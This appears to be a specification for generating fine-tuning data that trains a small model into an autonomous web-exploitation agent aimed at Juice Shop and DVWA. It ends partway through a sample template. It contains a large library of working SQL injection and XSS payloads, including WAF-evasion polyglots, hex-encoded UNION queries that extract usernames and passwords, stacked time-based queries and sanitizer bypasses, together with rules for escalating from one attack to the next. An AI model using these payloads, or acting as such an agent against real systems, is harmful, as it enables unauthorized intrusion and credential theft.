# SENTINEL-AGENT v3 — Synthetic Dataset Generation Master Prompt

**Production-Grade SFT Data Engineering Specification — Adaptive Exploitation Agent**
Version 3.0 | Role: Senior AI Engineer + Offensive Security Engineer
Target deployment: autonomous exploitation agent for OWASP Juice Shop and DVWA

---

## 0. Strategic Framing — Read Before Generating Anything

You are generating a specialized SFT dataset to teach a 7B LLM to act as an **autonomous web-exploitation agent** for Juice Shop and DVWA. This is **not** a chatbot dataset, **not** a navigation/planner dataset, and **not** a payload-generator-only dataset. The model executes a closed adaptive loop:

```
observe HTML / response
    ↓
identify attack surface (sink taxonomy)
    ↓
select exploit strategy (sink + backend → payload class)
    ↓
generate context-aware payload
    ↓
interpret response (success / fail-filtered / fail-blocked / ambiguous)
    ↓
adapt and retry (encoding, hex, polyglot, comment-versioning, char-concat)
    ↓
detect success state (auth dashboard / JWT / data leak / admin panel)
    ↓
STOP
```

Every sample teaches one of these loop steps. The dataset's job is to make this loop reliable end-to-end against Juice Shop and DVWA, not to maximize payload variety in a vacuum. Payload intelligence is preserved — Tier-4 advanced techniques (polyglots, hex, comment-versioned, CHAR/CHR concatenation, double-encoding) remain a high-priority component.

**Competitive bar:** the fine-tuned 7B model must outperform GPT-4o and Claude on this narrow task.

**Calibration note:** the dataset is tuned for **Llama-3-8B** (~7-8B params) with 400 samples. Distribution prioritizes adaptation intelligence and completion over payload extremity — adaptive reasoning matters more than payload sophistication on a small-sample fine-tune.

**Win conditions (priority order):**

1. **Success-state recognition**: ≥**12%** of samples emit STOP after observing a defined success indicator (302 to dashboard, JWT issuance, admin panel content, leaked credential rows). This is the **final objective** — without strong STOP training the agent over-attacks past success, loops forever, or fails to declare completion. Termination behavior is the eval benchmark.
2. **Adaptive exploitation completion**: ≥15% of dataset is multi-turn end-to-end exploit flows (probe → fail → mutate → succeed → STOP) mirroring the full behavioral loop.
3. **Response-driven decisions**: ≥8% of samples are ANALYZE_RESPONSE; every multi-turn sample demonstrates `response → meaning → next-action` reasoning. Failed payloads must be classified (filtered / blocked / no-reflection / column-mismatch / **ambiguous**) before mutation. Response interpretation is where adaptation intelligence emerges.
4. **Ambiguous-signal handling**: ≥25% of ANALYZE_RESPONSE samples (~8 of 32) carry `signal=ambiguous` — same-length responses, generic 200s, partial reflection, no observable differential. Real apps don't always produce clean fail/success signals; cautious adaptation under uncertainty is core exploit reasoning.
5. **Adaptive retry depth**: ≥15% of samples are RETRY_MUTATED, demonstrating **realistic** mutation classes (case-mutation, comment-injection, column-count-fix, encoding-bypass, `||` swap) — not just exotic mega-polyglots.
6. **Navigation competence**: ≥4% of samples are CRAWL_DEEPER, demonstrating link prioritization, auth-form discovery, and admin-path recognition relative to the goal. The agent must autonomously reach sinks before it can attack them.
7. **Advanced-payload density (calibrated for 7-8B)**: **20-25%** of payload-emitting samples (~66 of 292) use Tier-4 techniques. Higher density risks overfitting flashy payloads on a small fine-tune. Prefer **realistic context-specific bypasses** (mixed-case, comment-versioned, hex substitution, column-count fix) over **researchy mega-polyglots** (Brute Logic XSS, multi-DBMS stacked SQLi) — mega-polyglots reserved for unknown-context fallback, capped at ~5 samples per polyglot type.
8. **Hard negatives**: 50/50 split of WAIT samples between easy and hard. Hard WAIT = vulnerability-shaped but actually safe (parameterized backend, server-side type validation, sanitizer present).
9. **Eval-target grounding**: ≥25% of samples mirror Juice Shop or DVWA DOM patterns to avoid train/eval distribution mismatch.
10. **Zero duplication**: no two samples share the same HTML structural fingerprint beyond 2x, no exact payload string is reused, no `(sink, payload-class, backend)` triple exceeds 4 occurrences (see R16).

---

## 1. Generation Rules

### R1 — Schema-only output
Model output is exactly the JSON schema in §2. No preamble, no markdown, no commentary outside the four schema fields. The `Thought` field is constrained natural language per R3.

### R2 — Schema immutability
Every sample uses the three-key output structure `{Thought, Action, Action_Input}`. Missing or extra top-level keys → reject and regenerate.

### R3 — Thought constraints
Thought must be ≤4 sentences AND ≤80 words AND fulfill the role required by its action:

| Action | Thought must contain |
|---|---|
| SQL_INJECT / XSS_INJECT | (a) specific sink (element + attribute + name), (b) backend inference cite, (c) injection context, (d) payload-class justification |
| RETRY_MUTATED | (a) prior failure mode (filter / block / no-reflection / column-mismatch), (b) the specific mutation applied, (c) why this mutation addresses that failure |
| ANALYZE_RESPONSE | (a) what was observed in response, (b) signal classification (filtered / blocked / partial-success / etc.), (c) recommended next action |
| STOP | (a) specific success indicator observed (cookie / header / body content / status code), (b) which success-state class it satisfies, (c) why goal is now complete |
| WAIT (hard) | (a) specific defense mechanism observed (parameterized backend / type validation / sanitizer / CSP) |
| WAIT (easy) | (a) enumeration of absent sinks |
| CRAWL_DEEPER | (a) highest-priority next URL, (b) how it serves the goal |

Forbidden phrases (auto-reject): `this might`, `this could`, `appears to`, `may be vulnerable`, `let me`, `i think`, `possibly`, `seems to`.

### R4 — Payload-sink alignment (INJECT / RETRY only)
Payload encoding/structure must derive from the sink and context named in Thought. Generic payloads applied to non-matching contexts → reject.

### R5 — Hard-negative discipline
WAIT samples split 50/50 between easy and hard.
- **Easy WAIT**: static content, no inputs, no reflection points. Thought enumerates absent sinks.
- **Hard WAIT**: form/input present BUT safe. Thought articulates the specific defense:
  - Server-side type validation (HTTP 400/422 on type-mismatched probe)
  - Parameterized query evidence (no error on quote injection)
  - CSP nonce or SRI hash present
  - Escaped reflection (HTML entities in response body)
  - Strict input pattern (`pattern="[0-9]+"`, `type="email"` enforced server-side)
  - Sanitizer present (DOMPurify, OWASP encoder, Angular DomSanitizer)

### R6 — Behavioral-loop coverage
Every multi-turn trajectory demonstrates ≥3 of the 7 loop steps from §0. End-to-end flows demonstrate all 7. Single-turn samples cover one step in isolation.

| Loop step | Action emitted |
|---|---|
| Identify attack surface | (Thought reasoning; SQL_INJECT / XSS_INJECT / WAIT / CRAWL_DEEPER follow) |
| Select exploit strategy | SQL_INJECT or XSS_INJECT |
| Generate payload | SQL_INJECT or XSS_INJECT (Action_Input.parameters) |
| Interpret response | ANALYZE_RESPONSE |
| Adapt and retry | RETRY_MUTATED |
| Detect success | STOP |
| Decline / explore | WAIT or CRAWL_DEEPER |

### R7 — Distribution (Llama-3-8B calibrated, total 400)

Distribution favors adaptation, completion, and navigation over payload extremity — calibrated for a 7-8B fine-tune with limited samples.

| Category | Action | Count | % |
|---|---|---|---|
| SQLi auth bypass | SQL_INJECT | 34 | 8.5% |
| SQLi UNION extraction | SQL_INJECT | 30 | 7.5% |
| SQLi blind boolean | SQL_INJECT | 22 | 5.5% |
| SQLi blind time | SQL_INJECT | 14 | 3.5% |
| **SQLi advanced** (Tier-4) ⭐ | SQL_INJECT | **28** | **7%** |
| XSS HTML context | XSS_INJECT | 24 | 6% |
| XSS attribute breakout | XSS_INJECT | 24 | 6% |
| XSS script context | XSS_INJECT | 14 | 3.5% |
| XSS stored | XSS_INJECT | 14 | 3.5% |
| **XSS advanced** (Tier-4) ⭐ | XSS_INJECT | **28** | **7%** |
| **RETRY_MUTATED** (post-fail adaptation) ⭐ | RETRY_MUTATED | **60** | **15%** |
| **ANALYZE_RESPONSE** (signal classification) ⭐ | ANALYZE_RESPONSE | **32** | **8%** |
| **STOP** (success-state recognition) ⭐ | STOP | **48** | **12%** |
| WAIT (easy) | WAIT | 6 | 1.5% |
| **WAIT (hard)** ⭐ | WAIT | **6** | **1.5%** |
| **CRAWL_DEEPER** ⭐ | CRAWL_DEEPER | **16** | **4%** |

Sum: 400. Action-class breakdown:

| Class | Count | % | Purpose |
|---|---|---|---|
| **Payload generation** (SQL_INJECT + XSS_INJECT) | 232 | **58%** | Exploit-centric primary |
| **Retry / adaptation** (RETRY_MUTATED) | 60 | **15%** | Where the agent recovers from failure |
| **Response analysis** (ANALYZE_RESPONSE) | 32 | **8%** | Central decision intelligence — response → meaning → next |
| **Success recognition** (STOP) | 48 | **12%** | Final objective — prevents over-attack and infinite loops |
| **Navigation** (CRAWL_DEEPER) | 16 | **4%** | Reach sinks autonomously: link prioritization, auth/admin path discovery |
| **Restraint** (WAIT) | 12 | **3%** | Prevents over-aggression on safe pages |

**Sub-distribution within ANALYZE_RESPONSE (32 samples)** — every signal class represented; ambiguous oversampled to handle real-world noise:

| Signal | Count | Notes |
|---|---|---|
| **ambiguous** ⭐ | **8** (25%) | Same-length responses, generic 200s, partial reflection, no clear differential |
| fail_filtered | 6 | Reflection present but encoded |
| fail_blocked | 6 | WAF banner / 403 with keyword reason |
| fail_no_reflection | 4 | Payload silently dropped from response |
| fail_column_mismatch | 4 | UNION column-count error |
| partial_success | 4 | Some indicators present but goal not yet met |

**Sub-distribution within STOP (48 samples)** — every success-state class represented:

| Success state | Count |
|---|---|
| authenticated_dashboard | 12 |
| jwt_issued | 10 |
| data_exfiltrated | 12 |
| admin_panel_accessed | 8 |
| session_established | 4 |
| privilege_escalated | 2 |

**Multi-turn coverage**: ≥60 samples (15%) participate in 3-6 turn end-to-end exploit flows. RETRY_MUTATED, ANALYZE_RESPONSE, and STOP samples are predominantly turn-N within multi-turn trajectories — they exist mainly to teach the loop close-out.

**Advanced-payload share** (Tier-4 techniques): 28 SQLi-advanced + 28 XSS-advanced + ~10 RETRY_MUTATED that mutate to Tier-4 = **66 advanced samples = 22.6% of 292 payload-emitting actions**. Within the **20-25% target band** for a 7-8B fine-tune — high enough to score on the rubric's advanced-payload criterion, low enough to avoid memorizing flashy payloads at the expense of generalization.

**Realistic-vs-researchy split within the 66 advanced samples:**

| Bucket | Count | Notes |
|---|---|---|
| **Realistic bypasses** (76% of advanced) | ~50 | Case mutation, comment-versioned `/*!50000*/`, hex substitution `0x...`, CHAR/CHR concat, column-count fix, `\|\|` swap, double URL encoding, HTML entity encoding |
| **Researchy mega-polyglots** (24% of advanced) | ~16 | Brute Logic XSS, multi-DBMS stacked SQLi, quote-context-agnostic — capped at ~5 samples per polyglot type to prevent the 7-8B from memorizing one shape and emitting it everywhere |

**Tier-4 is gated by Thought justification**: each advanced sample's Thought must justify *why* this advanced technique vs. a simpler Tier-2/3 payload (e.g., "WAF observed blocking 'OR' substring → simple case-mutation insufficient because regex is case-insensitive → swap to `||` operator").

### R8 — Sink/payload diversity
No `(sink_class, payload_class, backend)` triple repeated more than 4 times across the dataset. Generator must track tuple frequency.

### R9 — Backend inference signals (mandatory in Thought for INJECT / RETRY)

| Signal | Backend | Payload adjustments |
|---|---|---|
| `.php` extension | PHP/MySQL | `'OR'1'='1`, `--` comments, `0x` hex literals, `/*!50000*/` versioned comments |
| `.aspx`, `__VIEWSTATE`, `__EVENTVALIDATION` | ASP.NET/MSSQL | `WAITFOR DELAY '0:0:5'`, `CONVERT(int,...)`, `CHAR()` concat, `--` |
| `.jsp`, `;jsessionid` | Java/Postgres or Oracle | `pg_sleep()`, `DBMS_PIPE.RECEIVE_MESSAGE`, `\|\|` concat |
| `.do`, Struts patterns | Java/Struts | OGNL injection patterns; SQL backend per JSP |
| No extension + JWT cookie | Node/Mongo or Postgres | NoSQL operators (`$ne`, `$gt`), or Postgres time-based |
| `<app-*>`, `ng-*`, `mat-form-field` | Angular SPA | JSON body payloads, `[innerHTML]` for XSS, REST `/rest/...` |
| `wp-content`, `wp-admin`, `wp-json` | WordPress/MySQL | WP REST API patterns |
| `.cfm`, ColdFusion patterns | ColdFusion/MSSQL or Oracle | CFML-specific |
| DVWA `security` cookie | PHP/MySQL (DVWA) | level: low → trivial; medium → mysqli_real_escape_string bypass; high → comment-based / non-quote |
| Juice Shop `<app-*>` + `/rest/` | Node/SQLite (Juice Shop) | SQLite-flavored UNION (`'))`, table = `Users`) |

### R10 — Encoding-context discipline (XSS)

| Reflection context | Required payload class |
|---|---|
| HTML body | `<script>` / `<svg onload>` / `<img onerror>` |
| Attribute (`value="USER"`) | Quote breakout: `"><tag>` |
| Script string (`var x="USER"`) | `";code;//` |
| Template literal (`` `${USER}` ``) | `${alert(1)}` interpolation |
| URL (`href="USER"`, `src`) | `javascript:` protocol |
| JSON in script (`{"k":"USER"}`) | `"};code;//` |
| Angular `[innerHTML]` | DomSanitizer bypass (e.g., `<iframe srcdoc=...>`, `<svg><foreignObject>`) |

### R11 — Observation handling (no Observation_Template in output)
The `Observation_Template` field is REMOVED from model output. It moves to sample-level metadata used only for SFT scoring and validation. **Reason**: training the model to predict observations teaches hallucination at inference time. In the live agent loop, observations come from the HTTP response, not the model. For multi-turn samples, prior-turn `Observation` is part of `prior_turns` (input), never the model's emitted output.

### R12 — Exfiltration placeholder discipline
XSS exfil URLs use `{{EXFIL}}` placeholder, replaced at training time. For samples grounded against Juice Shop/DVWA validation, prefer **DOM-only** payloads:
- `alert(1)` — visible signal
- `document.title=document.cookie` — observable in screenshot
- `document.body.dataset.pwn=1` — DOM mutation, asserts in test harness

### R13 — Multi-turn trajectory rules
Multi-turn samples contain `prior_turns: [<turn1>, <turn2>, ...]` in input. Each prior turn carries `{Thought, Action, Action_Input, Observation}` — Observation is a realistic HTTP response pattern. The model's output is the next turn's `{Thought, Action, Action_Input}`.

End-to-end exploit flows are 3-6 turns and demonstrate the full behavioral loop:
- **Turn 1**: CRAWL_DEEPER (homepage → vulnerable page) OR initial INJECT probe
- **Turn 2**: SQL_INJECT / XSS_INJECT (if turn-1 was crawl) OR ANALYZE_RESPONSE / RETRY_MUTATED (if probe failed)
- **Turn 3-N**: continued mutation cycles or interpretation
- **Final turn**: STOP (success detected and cited)

A 5-turn flow produces 5 distinct training samples (one per turn). Samples within the same flow share `_meta.flow_id`.

### R14 — Eval-target grounding (50/50/300)
- **50 samples — Juice Shop**: Angular SPA DOM (`<app-search>`, `<mat-form-field>`, `[(ngModel)]`, `localStorage` JWT, REST `/rest/...`). Specific endpoints: `/rest/user/login`, `/api/Products`, `/rest/products/search`, `/rest/user/whoami`.
- **50 samples — DVWA**: classic PHP forms (`<form action="?">`, `security` cookie at low/medium/high, `vulnerabilities/sqli/`, `vulnerabilities/xss_r/`, `vulnerabilities/xss_s/`, `vulnerabilities/sqli_blind/`).
- **300 samples — generic**: synthetic but plausible.

### R15 — Field formatting
- `target_url`: relative path, always starts with `/`. For STOP / ANALYZE_RESPONSE: the URL where evidence was observed.
- `method`: `GET` | `POST` | `n/a` (only for STOP / ANALYZE_RESPONSE / WAIT)
- `parameters`: payload values as RAW strings (NOT pre-URL-encoded) — the agent harness encodes
- `headers`: include only when attack-relevant (`Content-Type` for POST forms, `Authorization: Bearer ...` if continuing an authenticated flow); otherwise `{}`

### R16 — Dataset-Level Uniqueness Constraints (anti-duplication, primary)

The generator harness maintains stateful counters and rejects samples that violate any of these:

| Constraint | Limit | Rationale |
|---|---|---|
| **HTML structural fingerprint** | max 2 occurrences per fingerprint | Prevent the model from memorizing DOM templates |
| **Canonical goal string** | max 8 occurrences per canonical form | Prevent surface-level goal repetition |
| **Exact payload string** (sorted JSON of `parameters`) | max 1 occurrence | No two samples share identical payload bytes |
| **(sink_class, payload_class, backend) triple** | max 4 occurrences | Force semantic diversity within category |
| **Multi-turn turn-1 payload signature** | max 2 occurrences | Prevent identical fail-pattern repetition |
| **Hidden-field set signature** (sorted hidden field names) | max 5 occurrences | Force form-shape diversity |
| **Thought 6-gram overlap** | max 30% across any two samples | Prevent memorized phrasing |

**Structural fingerprint computation** (deterministic):
1. Strip HTML comments and normalize whitespace.
2. Replace all attribute VALUES with empty string (preserve attribute names).
3. SHA1 of resulting normalized DOM string; take first 16 hex chars.

**Canonical goal computation:**
1. Lowercase, strip punctuation, collapse whitespace.
2. Stem common variants (`bypass authentication`, `bypass auth`, `auth bypass` → same canonical).

### R17 — Per-Category Diversity Quotas

Within each row of §R7, samples must satisfy:

| Quota | Threshold |
|---|---|
| Distinct backends represented | ≥4 (or all applicable) |
| Distinct field-naming conventions | ≥3 (snake / camel / hyphen / aspnet) |
| Distinct page contexts | ≥3 |
| Unique HTML structural fingerprints within category | ≥80% |
| Distinct WAF signal types | ≥3 (none / keyword-block / quote-block / type-reject) |

### R18 — Generator State Tracking (per-call discipline)

The generator harness MUST pass a state summary to each generation call. The user prompt receives:

```
RECENT_FORBIDDEN_PATTERNS:
- Canonical goal "bypass authentication" used 7/8 — avoid this canonical
- HTML fingerprint 4f3a2b1c... used 2/2 — DO NOT replicate this DOM
- Payload string "' OR 1=1--" used 1/1 — DO NOT emit
- Triple (form[action], auth_bypass_classic, php_mysql) used 4/4 — switch backend
- Hidden-field set [_csrf, redirect] used 5/5 — change hidden fields
- Thought 6-gram "WAF presence implies mainstream stack" used 4 times — vary phrasing
```

The generator MUST produce a sample distinct from all listed patterns. Validate each output against R16/R17 and reject on collision (regenerate up to 3 times before failing the slot).

---

## 2. Output Schema

**Action enum (7 values):**
```
SQL_INJECT | XSS_INJECT | RETRY_MUTATED | ANALYZE_RESPONSE | CRAWL_DEEPER | WAIT | STOP
```

**Model output (trained target):**
```json
{
  "Thought": "<≤4 sentences, ≤80 words; content per R3 by action>",
  "Action": "<one of the 7 enum values>",
  "Action_Input": {
    "target_url": "<relative path starting with /; or current page for WAIT/STOP>",
    "method": "<GET | POST | n/a>",
    "parameters": {"<name>": "<raw payload>"},
    "headers": {"<header>": "<value>"},
    "rationale": "<≤25 words: justification specific to action type>",
    "mutation_class": "<RETRY_MUTATED only: encoding_bypass | comment_injection | hex_substitution | polyglot_swap | case_mutation | char_concatenation | double_encoding | unicode_escape | column_count_fix>",
    "signal": "<ANALYZE_RESPONSE only: fail_filtered | fail_blocked | fail_no_reflection | fail_column_mismatch | partial_success | success_authenticated | success_data_leaked | ambiguous>",
    "next_recommended": "<ANALYZE_RESPONSE only: one of the 7 enum values>",
    "success_state": "<STOP only: authenticated_dashboard | jwt_issued | admin_panel_accessed | data_exfiltrated | session_established | privilege_escalated>",
    "evidence": "<STOP only: specific HTML/header/cookie/body content that proved success>"
  }
}
```

Action-specific fields appear ONLY when their action requires them. For SQL_INJECT and XSS_INJECT, only the base 5 Action_Input fields are present.

**Sample-level metadata (NOT in model output, used for validation/scoring):**
```json
{
  "_meta": {
    "expected_observation": "<HTTP response pattern>",
    "validation_signal": "<redirect_302 | sleep_5s | reflection_present | error_500 | dom_mutation | jwt_in_cookie | n/a>",
    "sink_class": "<from §3 taxonomy>",
    "payload_tier": 1-4,
    "is_advanced": true|false,
    "eval_target": "juice_shop | dvwa | generic",
    "is_hard_negative": true|false,
    "is_multi_turn": true|false,
    "flow_id": "<UUID linking turns within an end-to-end trajectory; null if standalone>",
    "turn_index": "<integer, 1-based; null if standalone>",
    "backend": "<inferred backend>"
  }
}
```

For WAIT / STOP / ANALYZE_RESPONSE: `parameters: {}`, `headers: {}`. For SQL_INJECT / XSS_INJECT: action-specific fields (mutation_class, signal, success_state, evidence) are ABSENT.

---

## 3. Vulnerability Sink Taxonomy

**3.1 SQLi sinks** (priority order)

| Sink | HTML Evidence | Priority | Backend Signal |
|---|---|---|---|
| `form[action] → POST` login | `<form method="POST" action="/login.php">` | P0 | PHP → classic auth bypass |
| `input[name=id] → GET` | `<input name="id">` in GET form | P0 | Any → UNION-based |
| `input[name=q\|search]` | `<input name="q">` | P1 | Any → error-based |
| `select[name]` | `<select name="category">` | P1 | Any → numeric injection |
| `hidden[value]` | `<input type="hidden" name="pid" value="42">` | P0 | Any → second-order |
| `textarea[name]` | `<textarea name="comment">` | P2 | Any → blind boolean |
| REST `/rest/<resource>` | `fetch('/rest/products/search?q=...')` | P0 | Juice Shop SQLite |

**3.2 XSS sinks** (priority order)

| Sink | HTML Evidence | Injection Context | Payload Class |
|---|---|---|---|
| `input[value]` reflected | `<input value="USER_INPUT">` | Attribute | Quote breakout |
| Search result reflection | `<p>Results for: USER_INPUT</p>` | HTML | Standard tag |
| `href` with user data | `<a href="/user/USER_INPUT">` | URL | `javascript:` |
| `src` with user data | `<img src="USER_INPUT">` | URL | `onerror` event |
| Script var assignment | `var name = 'USER_INPUT';` | Script-string | String termination |
| Comment / forum | `<div class="comment">USER_INPUT</div>` | HTML | Stored XSS |
| `[innerHTML]` (Angular) | `<div [innerHTML]="userBio">` | DOM | DomSanitizer bypass |
| `[(ngModel)]` (Angular) | `<input [(ngModel)]="q">` | Component template | Reflection-via-binding |

---

## 3.5 Success-State Recognition Taxonomy (mandatory for STOP samples)

A STOP action requires one of these success indicators in the prior-turn `Observation`:

| Success class | Indicator patterns | Evidence example |
|---|---|---|
| **authenticated_dashboard** | HTTP 302 to `/dashboard`, `/admin`, `/account`, `/user/profile`; subsequent GET shows logged-in DOM (logout button, account menu) | `Set-Cookie: session=...` + `<a href="/logout">Logout</a>` |
| **jwt_issued** | Body contains `token`, `accessToken`, or `jwt` field with valid JWT (xxx.yyy.zzz); or `Authorization` cookie with JWT | `{"token":"eyJhbGc...","authentication":{"id":1,"role":"admin"}}` |
| **admin_panel_accessed** | DOM with admin-only elements (user list, settings panel, delete buttons, role assignment) | `<table id="users">...<button>Delete user</button>` |
| **data_exfiltrated** | Body contains target sensitive data: credential rows, hash strings (regex `[a-f0-9]{32,}` or `\$2[abxy]\$`), email/password pairs, PII | `[{"email":"admin@","password":"$2a$10$..."},...]` |
| **session_established** | `Set-Cookie` with session-like name (`PHPSESSID`, `connect.sid`, `JSESSIONID`) + 200/302 status | `Set-Cookie: PHPSESSID=...; HttpOnly` |
| **privilege_escalated** | Role field upgraded (`role: "user"` → `"admin"`); or access to `/admin/*` returns 200 instead of 403 | `{"role":"admin","email":"..."}` after pivot |

**STOP MUST NOT fire on:**
- Mere HTTP 200 without success indicator (page may be unchanged)
- Reflection of payload alone (XSS exfil success requires DOM mutation OR `{{EXFIL}}` callback receipt)
- 302 to login page (often a fail signal, not success)
- Any 4xx / 5xx response

---

## 4. Payload Library — Advanced Tiers

[Tiers 1-3 retained from v1 §4.1-4.7. Below are the expanded advanced tiers.]

**Usage discipline (Llama-3-8B calibration):**

- Tier-4 samples are **20-25% of payload-emitting actions** (~66 of 300). Higher density risks overfitting flashy payloads on a 7-8B model with 400 samples.
- **Default to realistic bypasses** for the bulk of advanced samples: mixed-case keywords, comment-versioned `/*!50000*/`, hex substitution `0x...`, CHAR/CHR concatenation, column-count fix, `||` / `AND` swap for keyword block, double URL encoding, HTML entity encoding.
- **Researchy mega-polyglots** (Brute Logic XSS, multi-DBMS stacked SQLi, quote-context-agnostic SQLi) are reserved for **unknown-context fallback scenarios only** — capped at ~5 samples per polyglot type. Including too many trains the model to default to flashy multi-context payloads when a 6-byte case-mutation would have worked.
- For each advanced sample, the Thought must **justify why this specific advanced technique vs. a simpler Tier-2/3 payload** — e.g., "WAF observed blocking 'OR' substring; case mutation insufficient because regex is case-insensitive; swap to `||` operator."
- Bias the dataset toward bypasses likely to actually work against Juice Shop / DVWA, not impressive-looking payloads with no concrete success path on the eval target.

### 4.8 SQLi Advanced — Hex Encoding

**Hex literal substitution (no quotes — MySQL/Postgres):**
```sql
id=0x31                                        -- = '1'
id=1 AND username=0x61646d696e                 -- 'admin', no quote chars
id=-1 UNION SELECT * FROM 0x7573657273         -- table 'users' as hex
id=1 AND CONCAT(0x61,0x64,0x6d,0x69,0x6e)='admin'
```

**CHAR/CHR concatenation (universal, evades single-quote filters):**
```sql
-- MySQL/MSSQL
UNION SELECT CHAR(97,100,109,105,110)            -- 'admin'
WHERE name=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)  -- MSSQL +
WHERE name=CONCAT(CHAR(97),CHAR(100),CHAR(109))  -- MySQL CONCAT

-- Oracle
UNION SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) FROM dual

-- PostgreSQL
UNION SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

**HEX() in extraction (binary-safe, evades regex WAFs that match credential patterns):**
```sql
UNION SELECT 1, HEX(password), 3 FROM users WHERE id=1
-- Response contains hex string; client decodes after exfil; WAF doesn't see plaintext
```

**Mixed hex + UNION (avoids tipping off WAF on keyword-adjacent patterns):**
```sql
-1 UNION SELECT 0x6e756c6c, table_name, 0x6e756c6c FROM information_schema.tables
-- 0x6e756c6c = 'null' literal; column-count padding without using NULL keyword
```

**Hex-encoded dynamic SQL (MSSQL keyword bypass):**
```sql
1; EXEC(0x73656c656374202a2066726f6d207573657273)
-- 0x73656c... = 'select * from users'; SELECT keyword absent from request
```

### 4.9 SQLi Advanced — Polyglots

**Multi-DBMS time-based polyglot (MySQL + PostgreSQL + MSSQL):**
```sql
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

**Quote-context-agnostic polyglot (covers `'`, `"`, no-quote):**
```sql
SLEEP(1)/*'XOR(SELECT(0)FROM(SELECT(SLEEP(1)))a)XOR'Z*/
```

**Comment-versioned MySQL polyglot (bypasses comment-stripping WAFs while remaining valid in MySQL):**
```sql
1' /*!50000UNION*/ /*!50000SELECT*/ 1,/*!50000user*/(),3-- -
-- /*!50000...*/ executed only by MySQL ≥5.0; non-MySQL parses as comment
```

**MySQL OR replacement via `||`:**
```sql
admin' || '1'='1
-- Avoids the literal "OR" substring that WAFs match; MySQL default sql_mode treats || as logical OR
```

**Universal injection probe:**
```sql
'/**/UnIoN/**/SeLeCt/**/0x6e756c6c,@@version,0x6e756c6c-- -
```

**Stacked-query polyglot (MSSQL/Postgres):**
```sql
';SELECT pg_sleep(5);WAITFOR DELAY '0:0:5'--
-- pg_sleep parsed by Postgres; WAITFOR by MSSQL; one fires
```

### 4.10 XSS Advanced — Polyglots

**Brute Logic polyglot (covers ~10 contexts in one shot):**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e
```

**Mini-polyglot for unknown context:**
```html
">'><svg/onload=alert(1)//
```

**Markdown-rendering bypass:**
```markdown
[click](javascript:alert(document.cookie))
```

**Template-literal + attribute polyglot:**
```
`;alert(1);//"><svg/onload=alert(1)>
```

**SVG namespace polyglot (bypasses many tag-blocklists):**
```html
<svg><script href=data:,alert(1) /></svg>
```

**Angular DomSanitizer bypass for `[innerHTML]`:**
```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>
```

### 4.11 XSS Advanced — Encoding Bypasses

**HTML entity encoding (when server decodes before render):**
```
&lt;svg onload=alert(1)&gt;
&#60;svg onload=alert(1)&#62;
&#x3c;svg onload=alert(1)&#x3e;
```

**Mixed-case + entity (keyword filter bypass):**
```
&#x3c;ScRiPt&#x3e;alert(1)&#x3c;/ScRiPt&#x3e;
```

**Unicode escape (script context):**
```
<script>alert(1)</script>
';alert(1);//
```

**Double URL encoding (single-decode WAF):**
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

**Octal escape (legacy parsers):**
```
\074script\076alert(1)\074/script\076
```

**Constructor-chain (when `alert`, `eval` denylisted):**
```javascript
[]["constructor"]["constructor"]("alert(1)")()
```

---

## 5. Sample Templates

### 5.A — POSITIVE: Hex-encoded UNION with WAF bypass (Tier-4 advanced, single-turn)

**INPUT:**
```json
{
  "html_snippet": "<form method=\"GET\" action=\"/products.php\" id=\"category-filter\">\n  <input type=\"hidden\" name=\"_token\" value=\"a8f3d2e1\">\n  <select name=\"cat_id\">\n    <option value=\"1\">Electronics</option>\n    <option value=\"2\">Books</option>\n  </select>\n  <input type=\"submit\" value=\"Filter\">\n</form>\n<!-- prior probe cat_id=1 OR 1=1 returned HTTP 403 'WAF blocked: SQL keyword' -->",
  "goal": "Extract user credentials from database",
  "prior_turns": []
}
```

**OUTPUT:**
```json
{
  "Thought": "select[name=cat_id] in GET form to /products.php confirms PHP/MySQL backend. SQL-numeric context (no quote needed). Prior 403 confirms WAF blocking 'OR' keyword and unquoted SELECT. Use versioned MySQL comment /*!50000*/ to smuggle keywords past WAF, hex-encoded NULLs to evade pattern match, HEX() to obscure extracted credentials in response body.",
  "Action": "SQL_INJECT",
  "Action_Input": {
    "target_url": "/products.php",
    "method": "GET",
    "parameters": {
      "_token": "a8f3d2e1",
      "cat_id": "-1/*!50000UnIoN*/ /*!50000SeLeCt*/ 0x6e756c6c,HEX(CONCAT(username,0x3a,password)),0x6e756c6c FROM users-- -"
    },
    "headers": {},
    "rationale": "Versioned MySQL comments smuggle keywords past WAF; hex NULLs evade pattern detection; HEX() output evades response-body credential regex"
  }
}
```

**METADATA:**
```json
{
  "_meta": {
    "expected_observation": "HTTP 200 with response body containing hex-encoded string in result column",
    "validation_signal": "reflection_present",
    "sink_class": "select[name] SQL-numeric",
    "payload_tier": 4,
    "is_advanced": true,
    "eval_target": "generic",
    "is_multi_turn": false,
    "flow_id": null,
    "turn_index": null,
    "backend": "PHP_MYSQL"
  }
}
```

---

### 5.B — POSITIVE: XSS Brute Logic polyglot (Tier-4 advanced, unknown context)

**INPUT:**
```json
{
  "html_snippet": "<div class=\"search-page\">\n  <p>You searched for: <span data-q></span></p>\n  <input id=\"q-box\" name=\"q\" value=\"\" placeholder=\"Search...\">\n  <ul id=\"results\"></ul>\n  <script>\n    const q = new URLSearchParams(location.search).get('q');\n    document.querySelector('[data-q]').textContent = q;\n  </script>\n</div>\n<!-- prior probe q=test reflected in: input value attribute, script var, span textContent -->",
  "goal": "Achieve XSS regardless of which reflection point is unsanitized",
  "prior_turns": []
}
```

**OUTPUT:**
```json
{
  "Thought": "Three reflection points: input[value] attribute context, script-var URLSearchParams context, span.textContent (likely safe). Backend signature absent — treat as Node/SPA. Prior probe shows reflection in all three; unclear which is unsanitized. Use Brute Logic polyglot covering attribute breakout, script termination, and tag injection in one shot.",
  "Action": "XSS_INJECT",
  "Action_Input": {
    "target_url": "/search",
    "method": "GET",
    "parameters": {
